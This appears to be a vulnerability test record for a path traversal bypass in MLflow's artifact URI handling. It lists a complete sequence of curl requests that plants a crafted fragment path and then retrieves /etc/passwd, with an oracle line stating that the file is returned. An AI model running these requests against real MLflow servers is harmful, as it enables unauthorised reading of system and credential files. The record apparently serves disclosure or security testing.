title: Path traversal bypass in MLflow artifact URI handling due to fragment parsing
trigger_payload:
$ mlflow ui
$ curl -X POST -H 'Content-Type: application/json' -d '{"name": "bypass", "artifact_location": "http://host#/(..)/etc/"}' 'http://127.0.0.1:5000/api/2.0/preview/mlflow/experiment/create'
$ curl -X POST -H 'Content-Type: application/json' -d '{"experiment_id": "224397038277278053"}' 'http://127.0.0.1:5000/api/2.0/preview/mlflow/runs/create'
$ curl -X POST -H 'Content-Type: application/json' -d '{"name": "bypass"}' 'http://127.0.0.1:5000/api/2.0/preview/mlflow/models/create'
$ curl -X POST -H 'Content-Type: application/json' -d '{"name": "bypass", "run_id": "3ea60c6e13f544188adfcd7de0d8a79a"}' 'http://127.0.0.1:5000/api/2.0/preview/mlflow/model-versions/create'
$ curl 'http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=bypass&version=1'
oracle: The /etc/passwd file content is returned in the HTTP response
